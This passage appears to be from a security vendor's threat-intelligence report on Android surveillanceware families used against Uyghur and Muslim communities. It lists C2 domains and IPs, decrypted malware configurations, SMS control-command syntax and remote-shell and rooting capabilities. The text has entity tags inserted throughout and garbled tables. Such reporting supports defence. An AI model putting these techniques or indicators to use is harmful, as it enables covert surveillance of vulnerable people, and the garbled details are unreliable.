accessing either of the [CARDINAL] C2 servers over an [ORG] HTTPS connection again redirected the user to islamapk[.]com . However , the site content delivered on this site appeared to impersonate yet another [ORDINAL] third - party app store , yurdax [ . ] com . It is possible that the targets for [ORG] SilkBean may already be familiar with this site and this made infecting their devices with [NORP] SilkBean easier . A screenshot taken during the investigation of url which is exactly identical in content to http:// yurdax[.]com / android/.None of the APKs downloaded from the site during the investigation were malicious , although a significant fraction of the links were either not accessible or the target files did not exist . Lookout also began ingesting the same APKs foundon [ORG] SilkBean [ORG] C2 servers from other sources shortly before new samples of [ORG] SilkBean started appearing in [DATE] August [DATE] 2018 . The temporal correlation suggests that the site and malware campaign were being updated in parallel.11Lookout researchers also uncovered [CARDINAL] six applications requesting invasive permissions that connect to islamapk [ . ] com , with very telling package names as to who is being targeted . [CARDINAL] Two of the applications are known [NORP] SilkBean samples , while the remaining are not yet classified into any known families , but appear to look for a [ORDINAL] second stage download from islamapk[.]com , which at the time of writing could not be accessed . [CARDINAL] Two of the applications \u2019 package names are [GPE] com.uyghur.hunter.islamapk , and the other [CARDINAL] two are [PERSON] com.islamapk.uy , which is consistent with the targeting of [GPE] Uyghurs that Lookout researchers have seen . Connections to Other Uyghur - targeted [ORG] SurveillancewareThe detailed investigation into [NORP] SilkBean apps and infrastructure provided the starting point for piecing together the different elements of this mAPT into a larger picture . Starting from the [ORG] IP address ( 213.128.81[.]82 ) of the [CARDINAL] two previously mentioned [CARDINAL] C2 servers of [ORG] SilkBean ( www . englishedu - online[.]com and www.turkyedu - online[.]com ) we found that a number of similar C2 servers had also resolved to the same [ORG] IP address . This resolution has not changed since [DATE] January [DATE] 2016 ( for turkyedu - online[.]com ) and [DATE] October [DATE] 2017 ( for www.englishedu - online[.]com).A Maltego graph showing the resolutions of [ORG] SilkBean \u2019s [ORG] C2 domains to the [ORG] IP addresses 213.128.81[.]82 and [CARDINAL] 31.210.106[.]90 as well as someother domains resolving to the same [ORG] IPs since [DATE] February [DATE] 2016 . This image was compiled using RiskIQ \u2019s [ORG] Passive [ORG] DNS data . OSINT15 and RiskIQ16 research indicates that [ORG] uyghurappbazar[.]com and [ORG] overxtube[.]com are already publicly associated with [ORG] Android malware17 . Many sites have a naming convention with the pattern \u201c * edu-online.com \u201d and the rest appear to contain innocuous names or reference [PERSON] Uyghur - specific content , communicating with domains seen in the above graph , a [CARDINAL] C2 domain pattern \u201c * edu-online.com \u201d emerged as a common theme for many associated domain names this actor has made use of . From this , Lookout researchers uncovered [CARDINAL] hundreds ofsamples communicating with these domains , not all of which are [NORP] SilkBean surveillanceware . In fact , the majority of these downloaded samples belong to malware from the families [ORG] DarthPusher , [ORG] HenBox and [ORG] PluginPhantom . [ORG] SilkBean C2Domainsenglishedu - online.comC2 infrastructureexploration leadingto new domainsturkyedu - online.comnew*edu - online.comdomains204 [EVENT] New [EVENT] ApplicationsPhantomPluginHenBoxDarth [EVENT] PusherFlowchart highlighting the connection from [NORP] SilkBean infrastructure to new [ORG] APK samples tied to [CARDINAL] three other malware families , [ORG] DarthPusher , [ORG] PhantomPlugin and [ORG] HenBox . DarthPusher18 is classified by Lookout as an app dropper , i.e. malware with capability that can arbitrarily install an [ORG] Android [ORG] APK . An adversary can use this capability to push any piece of surveillanceware to an intended target device . PluginPhantom19 , or [ORG] IHide , was found to contain many separate [ORG] Android applications hidden within its resources . Each surveillance function of the malware , such as collecting call logs , location , SMS messages and more , was divided into separate APKs that were then loaded through the \u201c DroidPlugin \u201d framework for Android . Location tracking functions used only [ORG] Baidu libraries and most debuggingstatements appeared to be in [NORP] Chinese . Lookout researchers also noticed overlap with other [NORP] Chinese - developed code from [ORG] IronButler and [ORG] SpyWaller malware , which continues the trend of heavily reusing already existing malware tooling by the actor behind [ORG] SilkBean . HenBox20,21 , is a previously discovered surveillanceware already known to target the [ORG] Uyghur community . We can only attribute a small subset of these apps to the [NORP] SilkBean actor through the use of shared infrastructure and the similarity of the used domains to the previously mentioned pattern.18 url url url url record history links a number of these domains together , through the emails , , andBranching out from [ORG] WHOIS information , C2 domains , and [ORG] IP resolutions , Lookout researchers were able to find other potential C2 domains in use by the actor behind this tooling using the same targets and patterns . The majority ofknown [CARDINAL] C2 servers were registered with [ORG] Xin [ORG] Net [ORG] Technology [ORG] Corporation , a [NORP] Chinese domain provider that has a reputation for hosting phishing and malicious sites22 , and eNom23 . All others were hosted by Hetzner24.22 url url url domain nameLanguage of apps 00Malware familiesNotescookedu - online[.]comArabic and ChineseHenBox , [ORG] DarthPusher , [ORG] DoubleAgentbabyedu - online[.]comUyghur and PashtoDoubleAgent , GoldenEagleMostly focused on people practicing [NORP] Islam . The use of [ORG] Pashto titles may indicate targeting of people in [GPE] Afghanistan and Pakistan25.newkidedu - online[.]com swimedu - online[.]comN / ADarthPusher , HenBoxOverlaps with DarthPusher.highschooledu - online [ . ] [NORP] comEnglish , [ORG] Pashto , and UyghurHenBoxfrancedu - online[.]comArabic , [GPE] Uzbek , [LANGUAGE] English and ChinesePluginPhantomenglishedu - online[.]comEnglishSilkBean , DarthPusherturkyedu [PERSON] - online[.]comUyghur and ArabicSilkBean , DarthPusherTargeting newcomers to [GPE] Turkey who speak [LANGUAGE] English , with titles such as \u201c Turkey Navigation \u201d and \u201c [WORK_OF_ART] Cities [WORK_OF_ART] of [WORK_OF_ART] Turkey \u201d ; also secure messaging and [ORG] VPN apps ( Psiphon , [PERSON] Zapya and Voxer).Domain names suggest possible targets in [GPE] France . Mostly apps focussing on people practicing [NORP] Islam . Also secure messaging apps such as [ORG] TalkBox.\u0627\u064a\u0631\u0648\u0633 \u0631\u0627\u0628\u062e\u0627\u0644\u0644\u0627\u0642\u0649\u062a\u0633\u0649\u0626App titles \u201c \u201d ( Syria News ) , \u201c \u201d ( Independence ) [ORDINAL] third - party app stores and secure messaging . [PERSON] Targeting [PERSON] Uyghurs and people in [ORG] Syria26 . Continued to see samples into [DATE] June 2019.childedu [DATE] - online[.]comIndonesian / [NORP] Malay , [NORP] Turkish , Urdu/ Hindi , EnglishPluginPhantomturknews - online[.]comEnglish and UyghurSilkBean , DoubleAgentarabiaedu [ORG] - online[.]com egyptedu - online[.]comN / AN / ATitles reference apps for live radio and TV ( istiqlaltv , [ORG] UYGHURTV and A2Z [ORG] Kuwait [ORG] FM [ORG] Radio ) and religious books and apps for [ORG] Islam and [NORP] Christianity in a number of languages including [LANGUAGE] English , [NORP] Arabic , [PERSON] Uyghur and [NORP] Turkish . Masquerading as portals to a number of [ORDINAL] third party app stores , some seen previously : islamapk[.]com and yurdax[.]com . Domain names suggest possible targets in [GPE] Saudi [GPE] Arabia and Egypt.25 url url turkyappbaziri[.]comN / Aoztilapk[.]com [ORG] uyghurappbazar[.]com datastore - ugy - dl[.]com [PERSON] marrip[.]orguyghur - soft - market[.]com uyghurapkbaziri[.]comN / AN / AN / AN / AN / ARegistered by who also registered turknews - online[.]com and turkyedu - online[.]com ( see above).Registered by who also registered babyedu - online[.]com childedu - online[.]com highschooledu - online[.]com . Other potential infrastructure related by [ORG] Passive [ORG] DNS informationC2 domains linked to [NORP] SilkBean and information on apps communicating with them . Many of the domains collected during our research above appear to suggest hosting content for [ORDINAL] third party app stores . For example , Oztil App Baziri appears to be yet another [PERSON] Uyghur - focused [ORDINAL] third party app store ( www . oztil.com ) , and also has been seen in other [ORG] HenBox and [ORG] DarthPusher titles . In fact , there are so many potential app stores that , without further insight intothe targeted community , it is difficult to discern if any of these are legitimate stores or malicious watering holes impersonating legitimate stores . As shown in the table above , the titles and languages used in these applications imply targeting of these malware families over a wide geographic area . There are titles in [CARDINAL] at [CARDINAL] least [CARDINAL] ten different languages , and many samples reference services in a number of countries around the world . While many apps are of interest to [NORP] Muslims in general , [PERSON] Uyghur populations abroad in these geographic regions have reportedly continued to see targeting by the [NORP] Chinese government 27,28,29.At least eighteen [ORDINAL] third - party app stores were found during this investigation , all serving pages in [GPE] Uyghur and [LANGUAGE] Arabic . Among some other general and utility apps , these stores also contained apps specific to the [LOC] Uyghur population or persons practicing [ORG] Islam . If at least some samples of [NORP] SilkBean were intended for [ORG] Uyghur targets residing in [GPE] China , the heavy use of [ORDINAL] third - party app stores makes sense since [LAW] the [LAW] Google [LAW] Play store is not available in the region . Secure messaging applications such as [ORG] WhatsApp and [GPE] Voxer could also be downloaded from these stores , but are not malicious and appear to be popular , modified versions of those legitimate applications.www.otkaxapp.com www.turkyappbaziri.com www.izda.com app.oztil.com uyghurapkbaziri.comoztilapk.com uyghurappbazar.com datastore-ugy-dl.com www.uyghur-soft-market.com [CARDINAL] 0ztil.com uyapkbazar.comA list of all [ORDINAL] third party app stores found connected to potential C2 infrastructure for [ORG] SilkBean , past and present . Some of these appear to be imitations of others , but it is difficult to confirm this for all of them since many are now offline.27 url url url depicting some of the many [ORDINAL] third - party app stores foundfocusing on persons that speak [LOC] Uyghur or practice [PERSON] Islam . There was [CARDINAL] one group of malicious applications whose details are not described in this section . Applications that communicate to turknews - online[.]com stood out to Lookout researchers as a completely different piece of malware . These are samples from a long - running family Lookout researchers have been tracking called DoubleAgent , described next in this report . Titles and functionality were particularly noteworthy as they display content from islamapk[.]com and yurdax[.]com , previously associated with [ORG] SilkBean [ORG] C2 server content . The most recent samples ingested by Lookout were initially foundon [ORG] VirusTotal and were uploaded through [CARDINAL] IPs located in [GPE] US , [GPE] Germany , and [GPE] Korea in [DATE] March and June of 2019.There are also malware samples communicating to the [CARDINAL] C2 server babyedu - online[.]com which belong to a surveillanceware known as [ORG] GoldenEagle , described in the last section of this report.17News , the official Daesh news application . The extent of this malware family and its connections to other campaigns has not been publicly reported on until now . Lookout researchers have seen DoubleAgent used exclusively against groups with contentious relationships with the [NORP] Chinese government . Although Lookout has been tracking this malware family for [DATE] many [DATE] years , new samples discovered in [DATE] the [DATE] last [DATE] year indicated that the actors behind DoubleAgent were continuing to evolve the surveillanceware and use new infrastructure . However , they maintained the same targeting , as well as several key malware characteristics , such as similar decryption keys for configuration files . These recent samples , discovered in [DATE] late [DATE] 2019 , are the focus of this section on [ORG] DoubleAgent . A decryption of the configuration files from these samples revealed a direct overlap in C2 infrastructure between the operators of [ORG] DoubleAgent and [ORG] SilkBean at a time when both malware families appeared to be active . The [ORG] C2s found also confirmed our findings that other domains resolving to the [ORG] IP address [CARDINAL] 213.128.81[.]82 since [DATE] February [DATE] 2016 were part of the same actor \u2019s infrastructure . This leads us to believe that the same actor is behind the use of [ORG] DoubleAgent and [ORG] SilkBean . Titles also suggest targeting of the DoubleAgent family has included the [LOC] Uyghur population , with these most recent samples masquerading as [ORDINAL] third - party [ORG] Android app stores ( islamapk[.]com and yurdax[.]com ) serving [ORG] Uyghur - focused applications and overlapping with C2 content seen when investigating [NORP] SilkBean . Consistent use of domain names that fit the pattern \u201c * -online.com \u201d was also noted across both these families . It appears to be important to the threat actor using [ORG] SilkBean to blend into the background noise while infecting their targets , and that is a recurring theme in their design choices . Many samples were signed with compromised signing certificates , and the campaigns involving [ORG] SilkBean uses known and abundant malware ( [ORG] DarthPusher , [PERSON] Spywaller ) to accomplish their tasks , perhaps so that there is no unique tooling to tie to them . Where custom tooling is used , it is blended into apps that may be downloaded by their targets , as well as making them as geographically and linguistically - specific as possible . There is also evidence that the actor has deliberately made use of titles , package names , and emails ( found in [ORG] WHOIS information ) that mimic the names of popular [ORG] Uyghur individuals and activists . For example , which was used to link may C2 domains together , may be referring to [ORG] Alimjan [ORG] Yimit30 , a [LOC] Uyghur [NORP] christian clergyman who was imprisoned in [CARDINAL] 2008.Campaigns associated with [ORG] SilkBean also appear to be long- running , at least since [DATE] 2015 , and this shows patience and perseverance by the operator in question . It also appears that this mobile tool is not only used to target the [LOC] Uyghur population within [GPE] China , but also around the world in countries such as [GPE] Turkey , [GPE] Syria , [GPE] Kuwait , [GPE] Indonesia , [GPE] Malaysia , [GPE] Afghanistan and [GPE] Pakistan . DoubleAgentFindings In [DATE] 2013 [PERSON] Citizen [PERSON] Lab reported on a compromised version of KakaoTalk31 , which had been used to target a prominent individual in the [NORP] Tibetan community . This app was the [ORDINAL] first publicly exposed sample of a malware family called DoubleAgent . When Lookout initially investigated DoubleAgent in [DATE] 2015 , it was already an advanced [ORG] Android remote access tool ( RAT ) . Early versions of this family trojanized apps such as [GPE] Voxer and [ORG] TalkBox , as well as Amaq30 url url detailsEach DoubleAgent sample comes with an encrypted file in the assets folder that contains configuration information for the malware and its command and control servers . On launch , the malware [PERSON] Base64 decodes the file , most recently disguised with the name \u201c GoogleMusic.png \u201d . This decoded text is then decrypted with a key formed by joining [CARDINAL] two strings hardcoded in the sample . [ORG] MessageDigest is used to calculate the MD5 of this string , which is then used as the final key when decrypting the configuration file using the [ORG] AES algorithm . Contents of the decrypted configuration file are split by a sequence of hash signs ( \u201c [MONEY] # [MONEY] # [MONEY] # \u201d or \u201c [MONEY] # [MONEY] # [MONEY] # [MONEY] # \u201d ) and then dollar signs ( \u201c $ $ $ $ $ \u201d ) . This allows the malware to parse out [CARDINAL] C2 information , decryption / encryption keys , beaconing and timeout periods , among other configuration details on how the malware is run on an infected device androidapps.spdns.org:990 $ $ $ $ $ comix_Qove $ $ $ $ $ HaPyzi0o825-$^ $ $ $ $ $ [MONEY] 1 [MONEY] # [MONEY] # [MONEY] # [MONEY] # android.apps.us.to:990 $ $ $ $ $ comix_Qove $ $ $ $ $ HaPyzi0o825-$^ $ $ $ $ $ [MONEY] 1 [MONEY] # [MONEY] # [MONEY] # [MONEY] # androidapps.nsupdate.info:990 $ $ $ $ $ holder - Peoq $ $ $ $ $ PhyOZ915_#@ $ $ $ $ $ 1 # # # # android.app.info.tm:990 $ $ $ $ $ holder - Peoq $ $ $ $ $ PhyOZ915_#@ $ $ $ $ $ 1 # # # [MONEY] # url [MONEY] # [MONEY] # [MONEY] # [MONEY] # 30 [MONEY] # [MONEY] # [MONEY] # [MONEY] # 600 [MONEY] # [MONEY] # [MONEY] # [MONEY] # 21600 # # # # 60 [MONEY] # [MONEY] # [MONEY] # [MONEY] # onDecrypted contents of early configuration files called \u201c google.ind\u201d.[{\u201cIP\u201d:\u201dwww.turknews - online.com\u201d,\u201dport\u201d:9701},{\u201cIP\u201d:\u201dwww.cookedu - online.com\u201d,\u201dport\u201d:9701},{\u201cIP\u201d:\u201dwww.turknews- areas for exfiltrated content and required infected devices to authenticate with credentials from the decrypted text file . In addition to serving as a staging area for exfiltrated information , the [ORG] FTP servers also hold files containing specific instructions that a device should carry out in the future . When an infected device beacons to C2 infrastructure it will check the [ORG] FTP server for files with the format < device IMEI > . fmd . These files contain commands for a discrete action like uploading a file , enabling a service such as audio recording , searching directories for specific files , or installing additional applications . Newer versions of [ORG] DoubleAgent upload files , unencrypted , directly to the [CARDINAL] C2 servers using [ORG] TCP sockets . Although the usual list of surveillance data is pulled and inserted into SQLite databases on the device ( such as system information , calls , contacts , SMS texts , apps installed , browsing history , and more ) , it is not uploaded unless instructed by the C2 which indicates that the actor behind DoubleAgent prefers handling data exfiltration carefully , likely to avoid detection.19In addition , [ORG] DoubleAgent also pulls the list of files , where possible , from the following set of locations when instructed to do so via C2 commands . It also monitors any changes and logs them in a SQLite database locally on the device.\u2022 /data / data / com.google.android.gm / shared_prefs(Gmail [ORG] app)\u2022 /data / data / com.google.android.gm / databases(Gmail app)\u2022 /data / data / com.android.email / shared_prefs(Default email [ORG] app)\u2022 /data / data / com.android.email / databases(Default email app)The most noteworthy RAT capabilities found to be present in these new samples are discussed below:\u2022 Runs arbitrary shell commands with or without rootprivileges , as specified by the C2 and returns the output of the command.\u2022 Remounts system as Read - Write , installs a file as a systemapp at the location /system / app / GoogleMail.apk , and remounts /system back to Read - Only permissions if it has root.\u2022Installs a specified [ORG] APK after a specified number of seconds.\u2022 Hides or unhides app icon.\u2022 /data / data / com.dropbox.android / databases\u2022 Updates C2 configuration.(Dropbox app)\u2022 /data / system\u2022 /DCIM\u2022 /PicturesSome samples of DoubleAgent feature code for downloading exploits in order to root the phone and install additional malware as a system app . Specifically , Lookout has seen the authors using [PRODUCT] TowelRoot in order to gain privileged access on victim devices and install additional malware on /system . This technique makes it difficult for the typical user to clean their device if infected . Messages received from the C2 can contain an object that specifies [CARDINAL] two things : a number representing [CARDINAL] one of up to [CARDINAL] 39 commands handled by the malware , and optionally a String object that specifies any further parameters , each separated by a sequence of hash signs ( \u2018 # \u2019 ) .\u2022 Gathers a list of running apps and a list of apps in theforeground.\u2022 Creates , deletes , and renames specific files.\u2022 [ORG] Records calls as .amr files , and zips them before sendingthe archive file out to the C2 server.\u2022 Has the ability to kill its background service if needed , likely either to avoid detection or save battery.\u2022 Stores all exfiltrated data in database ( .db ) files on thedevice.\u2022 Has a database to track what files need to be uploadedto or downloaded from the [CARDINAL] C2 server , as specified by commands provided to the malware.\u2022 Can either automatically or when directed by the [CARDINAL] C2 copy and upload data of popular communications applications , depending on [ORG] the [ORG] DoubleAgent [ORG] sample.20TalkboxDiDi ( rideshare app in [ORG] China)KeechatCocoVoxerWhatsAppAiretalkViberTelegramSkypeQQMicroMsgMagicCall [ORG] ( Voice [ORG] Changer app)Zello ( [PERSON] Push to talk)BBMList of applications whose files or databases are uploaded to DoubleAgent C2 servers of DoubleAgent samples seen in [DATE] 2019 . The malware also attempts to change the file permissions for all files under the /data / data/ directory of the above chat applications to permit read / write / execute for any UID.Instruction ( command ) [DATE] 38 , above , allows the attacker to execute a specified shell command along with an arbitrary number of parameters separated by a \u2018 # # # \u2019 string , without requesting root permissions . \u2018 Kshell \u2019 is the class in [ORG] DoubleAgentresponsible for executing shell commands with or without root permissions , as specified . If the command successfully getsexecuted , the output is sent back to the C2.21DoubleAgent \u2019s connection to other malware familiesIn late 2019 novel DoubleAgent samples appeared that had evolved significantly from previous versions , and a closer look at their configuration and C2 infrastructure highlighted new connections to [ORG] SilkBean , [ORG] HenBox and [ORG] DarthPusher . This strengthened the theory that the actor behind [ORG] DoubleAgent is also involved in the deployment , and perhaps even development , of these other malware families . Icons of the newly uncovered DoubleAgent samples , which aretitled \u201c Disk photo recovery \u201d , \u201c SafeUM \u201d , \u201c [WORK_OF_ART] Quran \u201d and \u201c Alphabet\u201d,the last [CARDINAL] two being in line with past targeting profiles . Many of the new DoubleAgent samples in [GPE] Lookout \u2019s app database contained configuration files , which , when decrypted , contained links to known [LAW] SilkBean [LAW] C2 infrastructure.[{},{},{},{\u201cIP\u201d:\u201dwww.turknews [LAW] - online.com \u201d , \u201c port\u201d:9701\u201cIP\u201d:\u201dwww.cookedu - online.com \u201d , \u201c port\u201d:9701\u201cIP\u201d:\u201dwww.turknews - online.com \u201d , \u201c port\u201d:9080 } ] [MONEY] # [MONEY] # [MONEY] # [MONEY] # 600####60####on[{},{},{},{\u201cIP\u201d:\u201dwww.turknews - online.com \u201d , \u201c port\u201d:9701\u201cIP\u201d:\u201dwww.turknews - online.com \u201d , \u201c port\u201d:9701 } ] [MONEY] # [MONEY] # [MONEY] # [MONEY] # 600####60####offTwo configurations found in recent DoubleAgent samples . The hardcoded [ORG] IP address present in [CARDINAL] one ofthe DoubleAgent configurations is pointed to by [CARDINAL] two domains of interest : classone- online[.]com and classedu - online[.]com . Asshown in the previous section on [ORG] SilkBean , the naming pattern \u201c * edu - online[.]com \u201d and \u201c * -online[.]com \u201d is consistent with the actorbehind [ORG] SilkBean as well as activity linked withthe same actor also employing [ORG] HenBox andPhantomPlugin malware [CARDINAL] families.22Four non - compromised signing certificates that signed samples of DoubleAgent were also used to sign applications belonging to the [ORG] HenBox , [ORG] DarthPusher and [ORG] CarbonSteal [ORG] Android surveillance families . [ORG] CarbonSteal is another novel malware family described in the next section of this report . This confirms the theory that the actor behind the deployment and use of the samples of these malware families is the same . An overlap in validity dates of these signing certificates may also indicate that these tools were under development and use in the same timeframe , starting in [DATE] early [DATE] 2015.Finally , code similarities in these samples of [NORP] SilkBean , [ORG] HenBox , [ORG] DarthPusher , [ORG] CarbonSteal and [ORG] DoubleAgent also suggest a common origin . For example , a malware sample [ORDINAL] first seen in [DATE] late [DATE] 2016 has unique code characteristics that belong to both [ORG] HenBox and [ORG] CarbonSteal , while being signed with a certificate that has also been used to sign DoubleAgent samples . Another sample ( SHA-1 : \u201c [NORP] Quran \u201d , possesses code similarities between [ORG] HenBox and DoubleAgent malware families , while also being signed with a certificate that was used to sign [CARDINAL] 48 other [ORG] HenBox , DoubleAgent , [ORG] DarthPusher and [ORG] CarbonSteal samples . This is another indicator that these malware tools are being used in tandem by the same actor . CarbonStealFindings In [DATE] March [DATE] 2018 , [GPE] Palo [GPE] Alto [GPE] Networks released a report on a [NORP] Chinese surveillanceware family named [PERSON] Henbox32 , which was found to be targeting minorities in [GPE] China . When examining this research closely , Lookout found numerous IoCs ( such as [CARDINAL] C2 and signer certificates ) overlapping with another long running surveillanceware family , [ORG] CarbonSteal , so named dueto signer certificates containing the phrase [PERSON] Y\u01d0ti\u0101n ji\u00e0n , thatmay be referring to a sword frequently advertised for sale as made from carbon steel . [ORG] CarbonSteal is [ORG] Android surveillanceware that has been tracked by Lookout since [DATE] 2017 , and [CARDINAL] more [CARDINAL] than [CARDINAL] 500 samples have been seen to date . While not as sophisticated as [ORG] HenBox , certain samples of [ORG] CarbonSteal do make use of a combination of native libraries and [ORG] DEX classes , while others do not and are much simpler . Hallmarks of [ORG] CarbonSteal include extensive audio recording functionality in a variety of codecs and audio formats , as well as the capability in later samples to control an infected device through specially crafted SMS messages . Attackers can also perform audio surveillance through the malware \u2019s ability to silently answer a call from a specific phone number and allow the attacker to listen in to sounds around an infected device . Based on this functionality , we suspect that [ORG] CarbonSteal might be deployed in areas with insufficient or no mobile data coverage . Samples of [ORG] CarbonSteal and [ORG] HenBox also use the same non- compromised signing certificates in many cases , suggesting the actor behind their deployment is the same . Furthermore , overlapping validity dates of these certificates may indicate that the samples were produced around the same time frame . This evidence led Lookout researchers to the theory that these tools were primarily used in an ongoing malware campaign ( at the time ) and against similar targets , with titles and languages once again suggesting a [ORG] Uyghur focused interest . Other overlaps in [CARDINAL] C2 and signer certificate IoCs indicate that tools such as [ORG] DarthPusher and [ORG] PhantomPlugin are also in this actor \u2019s mobile surveillance arsenal . Lastly , a C2 IP address that communicated with [ORG] CarbonSteal and [ORG] HenBox samples was also observed communicating with samples of an OS X backdoor that was tied to [ORG] GREF activity in [DATE] 2014 by FireEye33.32 url url detailsTitles for the vast majority of [ORG] CarbonSteal samples are \u201c \u201d , which translates to \u201c Setting \u201d , however the operators behind this familyalso used various [ORG] Google themed names and app icons for well known chat apps , [ORG] VPN apps and popular games in [GPE] China . They alsoimpersonated [ORG] Baidu apps ( such as iQIYI , an online video platform based in [GPE] Beijing and used by [ORG] the [ORG] Chinese [ORG] Taiwan [ORG] Affairs [ORG] Office to further [ORG] United [ORG] Front [ORG] ( China ) efforts)34 and Izda , a [ORG] Uyghur - focused search engine and content site . Titles such as \u201c [WORK_OF_ART] Quran \u201d , \u201c Dua \u201d and \u201c mullaim \u201d also point to a [NORP] Muslim focus of targets . CarbonSteal samples exhibit a high level of sophistication , with recent samples splitting their malicious functionality between native libraries and secondary APKs that get decrypted and loaded during execution , at times using reflection . Early samples appear to be based on the [FAC] Dendroid malware family . Throughout its implementation , [ORG] CarbonSteal maintains a focus on audio recording functionality and collection of data from chat applications popular in [GPE] China . CarbonSteal samples contain an RC4 encrypted configuration file ( usually config.txt or conf.txt ) where information such as command and control details ( [ORG] IP / domain and port ) , a control phone number , and a [ORG] UID are stored . Almost all samples also contain encrypted secondary [ORG] JAR or [ORG] DEX files in the assets folder , titled googlej.jpg and googles.jpg.\u2022 Retrieve device metadata including model , manufacturer , product , sdcard size , and memory specs.\u2022 Retrieve disk usage information.\u2022 Retrieve CPU information including device serial number.\u2022 Retrieve QQ content from external storage.\u2022 Retrieve installed apps and when they were installed.\u2022 Retrieve notes and data from MiCode35 , a community - run , open source version of the Xiaomi sticky note app , and even masquerades as this application.\u2022 Receive out - of - band instructions via SMS from numbersspecified in the configuration or retrieved from the C2.On compromised devices , [ORG] CarbonSteal samples have the following functionality:\u2022 Track the location of a device.\u2022 Remotely record audio.\u2022 Retrieve call logs.\u2022 [NORP] Search external storage for various files such as audio\u2022 Retrieve all SMS and [ORG] MMS messages.recordings ( .amr).34 url url\u2022 Call netcfg and get stats.\u2022 [PERSON] Log when the device is powered on and off.\u2022 Dynamically load additional functionality.\u2022If the superuser binary is present , use it to silently install additional applications\u2022 Test for the Flyme operating systems or [ORG] OPPO or [GPE] VIVOphones in order to turn off various power saving features . [ORG] CarbonSteal \u2019s capability for operation without the use of mobile data or [PERSON] WiFi is particularly interesting . Apps of this family monitor the sender of incoming text messages and caller ID of incoming calls and match it against a number specified in the configuration file . If a call is received from the control phone number , the malware turns off the device \u2019s ringer and answers the call immediately . This allows the operator of the control phone to listen in on the environment around the infected device . Once the call ends , the call log is deleted from call records on the device . CarbonSteal operators can also remotely control infected devices by sending them specially crafted text messages . The instruction set available via SMS in recent samples includes the following commands : Text message from control [NORP] phoneFunction@*a < digits>@*b < digits>@*c < digits>@*d[1|*][*|null]Retrieves the contact details associated with the number specified by < digits > Retrieves the call log details at a particular offset from the start of the call log list , specified by < digits > . Call log list is sorted with the most recent call first . Retrieves the SMS details at a particular offset from the start of the SMS list , specified by < digits > . SMS list is sorted with the most recent SMS first . Responsible for silently starting or stopping environment recording . To start recording the sequence @*d needs to be followed by [CARDINAL] 1 . To stop recording an adversary needs to supply any other value in place of the [CARDINAL] 1.If the text contains any other data , including if it is empty , this will trigger [ORG] CarbonSteal samples to get current cell information about the device including the 16 [QUANTITY] - bit [ORG] GSM [ORG] Cell [ORG] Identity , 16 [QUANTITY] - bit [ORG] Location [ORG] Area [ORG] Code as well as the the mobile country code ( MCC ) and mobile network code ( [ORG] MNC ) of the mobile network operator . Table showing the format of control SMS messages received and function performed by [ORG] CarbonSteal as a result . The retrieved data is sent back to thecontrol phone number using SMS messages . [ORG] CarbonSteal expects the control phone number to start with +86 , which is the dialing code for [GPE] China . Analysis of sample configurations only found [CARDINAL] one control phone number ( [CARDINAL] 158 7172 6845 ) specified for a small set of samples , which may belong to amobile number segment operated by [GPE] China [GPE] Mobile in [GPE] Wuhan [GPE] City , Hubei Province . CarbonSteal samples are able to encode audio data into a variety of encodings , such as G711 , G722 and [ORG] Speex and store audio files in a variety of file formats , such as .amr , .raw , .wav and .gms3 . CarbonSteal can send this audio data as complete recorded files through network sockets or by using RTP to stream data to a [PERSON] C2.25Audio and other data is stored at the following locations using timestamps as file [NORP] names:\u2022\u2022\u2022\u2022\u2022\u2022/mnt / sdcard / google / db / mp/<timestamp > ( general media recorder)/mnt / sdcard / google / db / mc/<timestamp > ( general media recorder)/mnt / sdcard / google / db / pr/<timestamp > ( phone call recorder)/mnt / sdcard / google / db / sr/<timestamp > ( SMS - triggered audio recorder)/mnt / sdcard / google / db / ps/<timestamp > ( screenshot [PERSON] capture)/mnt / sdcard / google / db1/<timestamp > ( seen in older samples , no use of [ORG] subfolders)Audio data can also be recorded to the following paths on external storage:\u2022/<sdcard>/FinalAudio.amr\u2022/<sdcard>/RawAudio.raw\u2022/<sdcard>/FinalAudio.wavCarbonSteal attempts to perform rudimentary SSL certificate validation by using the [CARDINAL] HostnameVerifier36 interface to confirm that the hostname of the [CARDINAL] C2 server communicating back to the malware is indeed the same one in the [ORG] SSL certificate the [ORG] SSL connection is using . [ORG] CarbonSteal appears to have been the most active in [DATE] 2017 , when the vast majority of new samples were seen . However , later samples of [ORG] CarbonSteal seen in [DATE] 2019 moved towards making extensive use of [ORG] Android accessibility services to exfiltrate messages from secure messaging applications , a trend commonly seen in other recent [ORG] Android surveillance malware . This suggests that [ORG] CarbonSteal is still under active development and continues to evolve . CarbonSteal C2 infrastructure and APT15 linksDuring the investigation of [ORG] CarbonSteal , the C2 domain amote-366.vicp[.]cc was found to be hosting numerous websites on a number of subdomains some of which contained content restricted in [GPE] China . Site content included a [ORG] GoogleDrive link to the book \u201c [WORK_OF_ART] Freedom [WORK_OF_ART] in [WORK_OF_ART] the [WORK_OF_ART] Sunset \u201d written by Professor [PERSON] Yuan [PERSON] Hongbing , which has been banned by [NORP] Chinese authorities . Other content included [ORG] Uyghur - themed political content and content that appears to be [NORP] Iranian specific . Legitimate applications were also found hosted on the same site , such as versions of [PERSON] Baidu [PERSON] Netdisk for [PERSON] MacOSX , Android , iOS and Windows.36 url of some of the hosted content on [ORG] CarbonSteal \u2019s C2 domain amote-366.vicp[.]cc . There could be a number of reasons a C2 server may be hosting this content . It is possible that the site originally hosted this content deliberately and was then compromised by the actor behind [ORG] CarbonSteal . The alternative is that the actor may have used the same server with a secondary purpose of luring individuals who are inclined to access this content . In either case , this setup allows the actor to monitor access to this content and possibly target those that do . Non - compromised signer certificates used to sign CarbonSteal samples were also used to sign a subset of malware samples belonging to the families known as [ORG] Henbox and [ORG] DarthPusher . This consistent use of the same mobilesurveillanceware families was also seen when examining [NORP] SilkBean and DoubleAgent samples . This may suggest that actors behind the use of these malware families not only share the same target groups but also resources and tools . In [DATE] March [DATE] 2018 , Lookout researchers discovered that certain [LAW] CarbonSteal [LAW] C2 domains overlapped with several HenBox samples found at the same time . A handful of these [ORG] CarbonSteal samples were also found to communicate to a particular [ORG] IP address ( [CARDINAL] 61.128.110[.]38 ) that overlapped with the deployment of an OSX backdoor XSLCmd reported by [PERSON] FireEye37 in [CARDINAL] 2014.37 url article initially described the activity as belonging to the threat actor [PERSON] GREF , but it was updated in [DATE] August [DATE] 2019 to note that the activity is now being tracked as an uncategorized [ORG] APT group . In past public reporting the actor known as [ORG] GREF is also referred to as APT15 , [ORG] Ke3chang , [ORG] Mirage , Vixen Panda andPlayful [PERSON] Dragon . [PERSON] GREF is so named due to a variety of Google references in their activities , and the same can be 